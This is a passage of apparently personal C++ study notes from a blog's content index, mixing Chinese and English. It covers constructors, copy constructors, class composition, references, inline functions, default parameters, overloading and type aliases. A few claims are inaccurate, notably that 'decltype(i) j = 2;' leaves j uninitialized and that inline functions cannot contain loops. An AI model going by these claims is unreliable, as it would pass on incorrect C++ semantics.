class="built_in">hour</span>(newH),<span class="built_in">minute</span>(newM),<span class="built_in">second</span>(newS)&#123;&#125;</span><br><span class="line"><span class="built_in">Clock</span>():<span class="built_in">Clock</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)&#123;&#125;</span><br><span class="line"><span class="comment">//有的编译器并不支持委托构造函数</span></span><br></pre></td></tr></table></figure><hr /><h3 id="复制构造函数">复制构造函数</h3><p>复制构造函数时一种特殊的构造函数，其形参为本类的对象引用。作用是用一个已存在的对象去初始化同类型的新对象。</p><p>用法：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> 类名</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        类名(形参);<span class="comment">//构造函数</span></span><br><span class="line">        类名(<span class="type">const</span> 类名&amp;对象名);<span class="comment">//复制构造函数</span></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line">类名::类(<span class="type">const</span> 类名&amp;对象名)<span class="comment">//复制构造函数的实现</span></span><br><span class="line">&#123;函数体&#125;</span><br></pre></td></tr></table></figure><hr /><h4 id="隐含的复制构造函数">隐含的复制构造函数</h4><ul><li>如果没有为类声明拷贝初始化构造函数，则比编译器自己生成一个复制构造函数。</li><li>这个构造函数执行的功能是：用作为初始值对象的每个数据成员的值，初始化将要建立的对象的对应数据成员。</li></ul><hr /><h4 id="delete">“=delete”</h4><p>如若不希望被复制构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Point(const Point&amp;p) = delete;</span><br></pre></td></tr></table></figure><hr /><h4 id="复制构造函数被调用的三种情况">复制构造函数被调用的三种情况</h4><ul><li>定义一个对象是，以被雷另一个对象作为初始值，发生复制构造</li><li>如果函数的形参是类的对象，调用函数时，将使用实参对象初始化形参对象，发生复制构造</li><li>如果函数的返回值是类的对象，函数执行完成返回主函数时，将使用return语句中的对象初始化一个临时无名对象，传递给主函数，此时发生复制构造</li></ul><hr /><h3 id="析构函数">析构函数</h3><p>作用：完成对象被删除前的一些清理工作</p><ul><li>在对象生存期结束的时刻系统自动调用它，然后再释放此对象所属的空间</li><li>如果程序中未声明析构函数，编译器会自动生成一个默认的析构函数，函数体为空</li></ul><hr /><h2 id="类的组合">类的组合</h2><p>说白了就是类的数据成员是别的类的对象，下面用计算两点之间线段的距离的程序来说明。</p><hr /><h3 id="线段类和点类实例">线段类和点类实例</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Point类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Point</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Point</span>(<span class="type">float</span> xx,<span class="type">float</span> yy); <span class="comment">//构造函数</span></span><br><span class="line">    <span class="built_in">Point</span>(); <span class="comment">//默认构造函数</span></span><br><span class="line">    <span class="built_in">Point</span>(Point &amp;p); <span class="comment">//复制构造函数</span></span><br><span class="line">    <span class="function"><span class="type">float</span> <span class="title">getX</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> x;&#125;</span><br><span class="line">    <span class="function"><span class="type">float</span> <span class="title">getY</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> y;&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">float</span> x,y;</span><br><span class="line">&#125;;</span><br><span class="line">Point::<span class="built_in">Point</span>(<span class="type">float</span> xx,<span class="type">float</span> yy):<span class="built_in">x</span>(xx),<span class="built_in">y</span>(yy)&#123;&#125; <span class="comment">//构造函数的定义</span></span><br><span class="line">Point::<span class="built_in">Point</span>():<span class="built_in">x</span>(<span class="number">0</span>),<span class="built_in">y</span>(<span class="number">0</span>)&#123;&#125; <span class="comment">//默认构造函数的定义</span></span><br><span class="line">Point::<span class="built_in">Point</span>(Point &amp;p) <span class="comment">//复制构造函数的定义</span></span><br><span class="line">&#123;</span><br><span class="line">    x=p.x;</span><br><span class="line">    y=p.y;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Calling the copy constructor of Point&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Line类，类的组合，计算两点之间的距离</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Line</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Line</span>(Point o1,Point o2); <span class="comment">//参数为Point对象的构造函数</span></span><br><span class="line">    <span class="built_in">Line</span>(Line &amp;l); <span class="comment">//复制构造函数</span></span><br><span class="line">    <span class="function"><span class="type">float</span> <span class="title">getLen</span><span class="params">()</span></span>; <span class="comment">//外部接口</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    Point p1,p2;</span><br><span class="line">    <span class="type">float</span> len=<span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line">Line::<span class="built_in">Line</span>(Point o1,Point o2):<span class="built_in">p1</span>(o1),<span class="built_in">p2</span>(o2) <span class="comment">//构造函数是每一个成员变量都要初始化的</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">float</span> x=p<span class="number">1.</span><span class="built_in">getX</span>()-p<span class="number">2.</span><span class="built_in">getX</span>();</span><br><span class="line">    <span class="comment">//此处并不能够直接写  p1.x - p2.x 因为x属于私有变量</span></span><br><span class="line">    <span class="comment">// 通过两个public成员函数可以访问，相当于提供了外部接口</span></span><br><span class="line">    <span class="type">float</span> y=p<span class="number">1.</span><span class="built_in">getY</span>()-p<span class="number">2.</span><span class="built_in">getY</span>();</span><br><span class="line">    len= <span class="built_in">sqrt</span>(x*x+y*y);</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Calling the constructor of Line&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">Line::<span class="built_in">Line</span>(Line &amp;l): <span class="built_in">p1</span>(l.p1),<span class="built_in">p2</span>(l.p2) <span class="comment">//复制构造函数是每一个成员变量都需要进行复制的 且这个&#x27;.&#x27;只能够在类的作用域内使用。</span></span><br><span class="line">&#123;</span><br><span class="line">    len=l.len;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Calling the copy constructor of Line&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">float</span> <span class="title">Line::getLen</span><span class="params">()</span> </span>&#123;<span class="keyword">return</span> len;&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">Point <span class="title">myp1</span><span class="params">(<span class="number">1</span>,<span class="number">1</span>)</span>,<span class="title">myp2</span><span class="params">(<span class="number">4</span>,<span class="number">5</span>)</span></span>;</span><br><span class="line">    <span class="function">Line <span class="title">line</span><span class="params">(myp1,myp2)</span></span>; <span class="comment">//参数传递的时候也需要复制构造哦</span></span><br><span class="line">    <span class="function">Line <span class="title">line2</span><span class="params">(line)</span></span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;The length of line is &quot;</span> &lt;&lt; line.<span class="built_in">getLen</span>() &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;The length of line2 is &quot;</span> &lt;&lt; line<span class="number">2.</span><span class="built_in">getLen</span>() &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr /><h3 id="前向引用声明">前向引用声明</h3><p>遇到两个类相互引用的情况，也称为循环依赖，简单理解就是你不能使用一个在前面完全没有出现过的标识符。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>;  <span class="comment">//前向引用声明</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;<span class="comment">//A类的定义</span></span><br><span class="line"><span class="keyword">public</span>:<span class="comment">//外部接口</span></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">f</span><span class="params">(B b)</span></span>;<span class="comment">//以B类对象b为形参的成员函数</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>&#123;<span class="comment">//B类定义</span></span><br><span class="line"><span class="keyword">public</span>:<span class="comment">//外部接口</span></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">g</span><span class="params">(A a)</span></span>;      <span class="comment">//以A类对象a为形参的成员函数</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> C/C++ Programming </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> C++ Programming </tag>
            
            <tag> C++ Language </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++ Functions</title>
      <link href="/2022/07/20/CPP/C++%20Functions/"/>
      <url>/2022/07/20/CPP/C++%20Functions/</url>
      
        <content type="html"><![CDATA[<h2 id="functions">Functions</h2><h3 id="rand-function">rand function</h3><p>Function prototype: <code>int rand(void);</code> Required headerfile: <code>&lt;cstdlib&gt;</code> Function and return value: Generatesand returns a pseudo-random number</p><hr /><h3 id="srand-function">srand function</h3><p>Function prototype: <code>void srand(unsigned int seed);</code>Parameter: seed for generating random numbers Required header file:<code>&lt;cstdlib&gt;</code> Function: Sets the starting point forrand() to generate a series of pseudo-random integers. Using 1 as theseed parameter can reinitialize rand().</p><hr /><h2id="it-should-be-noted-that-if-no-seed-is-used-the-random-numbers-generated-each-time-the-program-runs-will-be-fixed-and-unchanged.-therefore-the-rand-function-returns-pseudo-random-numbers.">Itshould be noted that if no seed is used, the random numbers generatedeach time the program runs will be <strong>fixed and unchanged</strong>.Therefore, the rand function returns <strong>pseudo-randomnumbers</strong>.</h2><h3 id="concept-of-references">Concept of References</h3><ul><li>A reference (&amp;) is an alias for an identifier;</li><li>When defining a reference, it must be initialized at the same timeto point to an existing object. For example:</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> i, j;</span><br><span class="line"><span class="type">int</span> &amp;ri = i; <span class="comment">// Define int reference ri and initialize it as a reference to variable i</span></span><br><span class="line">j = <span class="number">10</span>;</span><br><span class="line">ri = j;  <span class="comment">// Equivalent to i = j;</span></span><br></pre></td></tr></table></figure><ul><li>Once a reference is initialized, it cannot be changed to point toother objects. References can be used as formal parameters.</li></ul><div class="note info flat"><p>References can achieve bidirectional passing between function formalparameters and actual parameters</p></div><p>For example, the following program:</p><h2 id="section"><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">swap</span><span class="params">(<span class="type">int</span>&amp; a, <span class="type">int</span>&amp; b)</span> <span class="comment">// Define reference type formal parameters</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> t = a;</span><br><span class="line">    a = b;</span><br><span class="line">    b = t;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> x = <span class="number">5</span>, y = <span class="number">10</span>;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;x = &quot;</span>&lt;&lt;x&lt;&lt;<span class="string">&quot;  y = &quot;</span>&lt;&lt;y&lt;&lt;endl;</span><br><span class="line">    <span class="built_in">swap</span>(x, y);</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;x = &quot;</span>&lt;&lt;x&lt;&lt;<span class="string">&quot;  y = &quot;</span>&lt;&lt;y&lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></h2><h3 id="functions-with-variable-arguments">Functions with VariableArguments</h3><p>C++ standard mainly provides two methods</p><ul><li>If all actual parameter types are the same, you can pass a standardlibrary type called initializer_list;</li><li><h2id="if-the-actual-parameter-types-are-different-we-can-write-variable-parameter-templates-chapter-9.">Ifthe actual parameter types are different, we can write variableparameter templates (Chapter 9).</h2><h4 id="initializer_list">initializer_list</h4></li></ul><p><code>initializer_list</code> is a standard library type used torepresent an array of values of a specific type, defined in the headerfile of the same name.</p><hr /><h4 id="usage-of-initializer_list">Usage of initializer_list</h4><ul><li>initializer_list is a class template (templates are introduced indetail in Chapter 9)</li><li>When using templates, we need to follow the template name with apair of angle brackets, with type parameters inside the brackets. Forexample:</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">initializer_list&lt;string&gt;  ls;  <span class="comment">// The element type of initializer_list is string</span></span><br><span class="line">initializer_list&lt;<span class="type">int</span>&gt; li;      <span class="comment">// The element type of initializer_list is int</span></span><br></pre></td></tr></table></figure><ul><li>A special point about initializer_list is that the elements in itsobjects are always constant values, and we cannot change the values ofelements in initializer_list objects.</li><li><h2id="functions-with-initializer_list-formal-parameters-can-also-have-other-formal-parameters-at-the-same-time">Functionswith initializer_list formal parameters can also have other formalparameters at the same time</h2><h4 id="example-of-using-initializer_list">Example of usinginitializer_list</h4></li><li>When writing code to output error messages generated by the program,it’s best to use a unified function to implement this functionality, sothat error handling for all errors can be uniform. However, the types oferror messages are different, and the parameters passed when calling theerror message output function will also vary.</li><li><h2id="use-initializer_list-to-write-an-error-message-output-function-that-can-work-with-a-variable-number-of-formal-parameters.">Useinitializer_list to write an error message output function that can workwith a variable number of formal parameters.</h2><h3 id="inline-functions">Inline Functions</h3></li><li>Use the keyword inline when declaring.</li><li>At compile time, replace the call site with the function body,saving overhead from parameter passing, control transfer, etc.</li><li>Note:<ul><li>Inline function bodies cannot have loop statements and switchstatements;</li><li>The definition of an inline function must appear before the inlinefunction is first called;</li><li><h2id="exception-interface-declarations-cannot-be-made-for-inline-functions.">Exceptioninterface declarations cannot be made for inline functions.</h2><h4 id="application-example">Application Example</h4></li></ul></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">double</span> PI = <span class="number">3.14159265358979</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">double</span> <span class="title">calArea</span><span class="params">(<span class="type">double</span> radius)</span> <span class="comment">// inline keyword</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> PI * radius * radius;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">double</span> r = <span class="number">3.0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">double</span> area = <span class="built_in">calArea</span>(r);</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; area &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In essence, it omits function calls and returns, similar to directlypasting the function body to the call site.</p><table style="width:6%;"><colgroup><col style="width: 5%" /></colgroup><thead><tr class="header"><th>### constexpr Functions (not very clear about usage)</th></tr></thead><tbody><tr class="odd"><td>#### constexpr Function Example</td></tr><tr class="even"><td>- constexpr int get_size() { return 20; } - constexpr int foo =get_size(); // Correct: foo is a constant expression</td></tr></tbody></table><h3 id="functions-with-default-parameter-values">Functions with DefaultParameter Values</h3><h4 id="order-of-default-parameter-value-declarations">Order of DefaultParameter Value Declarations</h4><ul><li>Formal parameters with default values must be listed at therightmost of the parameter list, that is, there cannot be parameterswithout default values to the right of default parameter values;</li><li>The binding order of actual parameters and formal parameters whencalling is from left to right.</li><li>Example:</li></ul><h2 id="section-1"><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y = <span class="number">5</span>, <span class="type">int</span> z = <span class="number">6</span>)</span></span>;<span class="comment">// Correct</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> x = <span class="number">1</span>, <span class="type">int</span> y = <span class="number">5</span>, <span class="type">int</span> z)</span></span>;<span class="comment">// Error</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> x = <span class="number">1</span>, <span class="type">int</span> y, <span class="type">int</span> z = <span class="number">6</span>)</span></span>;<span class="comment">// Error</span></span><br></pre></td></tr></table></figure></h2><h4 id="default-parameter-values-and-function-call-location">DefaultParameter Values and Function Call Location</h4><p>If a function has a prototype declaration and the prototypedeclaration is before the definition, the default parameter valuesshould be given in the function prototype declaration; if there is onlythe function definition, or the function definition is first, thedefault parameter values can be given in the function definition. Forexample:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> x = <span class="number">5</span> ,<span class="type">int</span> y = <span class="number">6</span>)</span>；<span class="comment">// Prototype declaration first</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">add</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x+y;<span class="comment">// Default values cannot be specified here again</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="section-2"><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> x = <span class="number">5</span> ,<span class="type">int</span> y = <span class="number">6</span>)</span><span class="comment">// Only definition, no prototype declaration</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x+y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">add</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></h2><h3 id="function-overloading">Function Overloading</h3><p>C++ allows functions with similar functionality to be declared withthe same function name in the same scope, thus forming overloading. Thisis convenient to use and easy to remember.</p><p>Notes:</p><ul><li>Overloaded functions must have different formal parameters:different number or different type.</li><li>The compiler will choose which function to call based on the bestmatch of the type and number of actual parameters and formal parameters.(The compiler does not distinguish by formal parameter names andfunction return values)</li><li>Do not declare functions with different functionality as overloadedfunctions to avoid misunderstanding and confusion in call results.</li></ul><p>Function Overloading Application Example</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">sumOfSquare</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a * a + b * b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">double</span> <span class="title">sumOfSquare</span><span class="params">(<span class="type">double</span> a, <span class="type">double</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a * a + b * b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> m, n;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Enter two integer: &quot;</span>;</span><br><span class="line">    cin &gt;&gt; m &gt;&gt; n;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;Their sum of square: &quot;</span>&lt;&lt;<span class="built_in">sumOfSquare</span>(m, n)&lt;&lt;endl;</span><br><span class="line">    <span class="type">double</span> x, y;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Enter two real number: &quot;</span>;</span><br><span class="line">    cin &gt;&gt; x &gt;&gt; y;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;Their sum of square: &quot;</span>&lt;&lt;<span class="built_in">sumOfSquare</span>(x, y)&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Running result: Enter two integer: 3 5 Their sum of square: 34 Entertwo real number: 2.3 5.8 Their sum of square: 38.93</p>]]></content>
      
      
      <categories>
          
          <category> C/C++ Programming </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> C++ Programming </tag>
            
            <tag> C++ Language </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Important Points to Note in C++ Basics</title>
      <link href="/2022/07/20/CPP/Important%20Points%20to%20Note%20in%20C++%20Basics/"/>
      <url>/2022/07/20/CPP/Important%20Points%20to%20Note%20in%20C++%20Basics/</url>
      
        <content type="html"><![CDATA[<h2 id="data-input-and-output">Data Input and Output</h2><h3 id="io-streams">I/O Streams</h3><p>In C++, the flow of data from one object to another is abstracted as“streams”. cin and cout are predefined stream class objects, where cinis used to handle standard input (keyboard input), and cout is used tohandle standard output (screen output).</p><hr /><h3 id="predefined-insertion-and-extraction-operators">PredefinedInsertion and Extraction Operators</h3><p>“&lt;&lt;” is the predefined insertion operator, which when appliedto the stream class object cout can achieve the most general screenoutput.</p><p>“&gt;&gt;” is the extraction operator, which when applied to thestream class object cin can achieve the most general keyboard input.</p><hr /><h3 id="common-io-stream-library-manipulators">Common I/O Stream LibraryManipulators</h3><table><colgroup><col style="width: 30%" /><col style="width: 70%" /></colgroup><thead><tr class="header"><th>Manipulator Name</th><th>Meaning</th></tr></thead><tbody><tr class="odd"><td>dec</td><td>Numeric data in decimal representation</td></tr><tr class="even"><td>hex</td><td>Numeric data in hexadecimal representation</td></tr><tr class="odd"><td>oct</td><td>Numeric data in octal representation</td></tr><tr class="even"><td>ws</td><td>Extract whitespace characters</td></tr><tr class="odd"><td>endl</td><td>Insert newline and flush the stream</td></tr><tr class="even"><td>setsprecision(int)</td><td>Set decimal places for floating point numbers (including decimalpoint)</td></tr><tr class="odd"><td>setw(int)</td><td>Set field width</td></tr></tbody></table><hr /><h2 id="if-else-statements">if-else Statements</h2><p>First, the pairing method of <code>else</code> is to pair with the<code>if</code> at the same level by looking upward. For example:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>()</span><br><span class="line">    <span class="keyword">if</span>()</span><br><span class="line">    <span class="keyword">else</span>()</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">if</span>()</span><br><span class="line">    <span class="built_in">else</span>()</span><br></pre></td></tr></table></figure><p>This is feasible because all <code>else</code> statements have pairs,but indentation does not represent structure. Strictly speaking,<code>{}</code> should be used to distinguish different nesting levels.<strong>Only for distinguishing different structures</strong>.</p><hr /><p><strong>Counter-example</strong>:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>()</span><br><span class="line">    <span class="keyword">if</span>()</span><br><span class="line"><span class="keyword">else</span></span><br></pre></td></tr></table></figure><p>In this case, <code>else</code> pairs with the indented<code>if</code>.</p><hr /><h2 id="typedef-declaration">typedef Declaration</h2><p>typedef existing_type_name new_type_name_list</p><p>For example:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">double</span> Area,Volume;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> Natural;</span><br><span class="line">Natural i1,i2;</span><br><span class="line">Area a;</span><br><span class="line">Volume v;</span><br></pre></td></tr></table></figure><hr /><h2id="another-way-to-define-custom-types-besides-typedef-using">AnotherWay to Define Custom Types Besides typedef: using</h2><p><code>using new_type_name = existing_type_name</code></p><p>For example:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> Area = <span class="type">double</span>;</span><br><span class="line"><span class="keyword">using</span> Volume = <span class="type">double</span>;</span><br></pre></td></tr></table></figure><h2 id="auto-type-and-decltype-type">auto Type and decltype Type</h2><p><code>auto</code>: The compiler automatically determines the variabletype through the initial value <code>decltype</code>: Define a variablewith the same type as a certain expression, but do not initialize thevariable with that expression For example:<code>decltype(i) j = 2;</code> makes j have the same type as i, butdoes not initialize j with 2.</p><h2 id="section"></h2>]]></content>
      
